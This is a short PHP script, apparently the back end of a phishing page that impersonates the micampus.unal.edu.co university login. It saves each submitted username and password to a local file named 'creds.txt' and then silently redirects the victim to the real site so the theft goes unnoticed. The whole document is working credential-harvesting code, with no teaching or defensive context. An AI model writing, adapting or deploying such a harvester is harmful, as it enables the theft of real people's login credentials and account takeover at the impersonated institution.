<?php
file_put_contents("creds.txt", "Usuario: " . $_POST['username'] . " - Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://micampus.unal.edu.co"); // Redirige al sitio real
exit();
?>
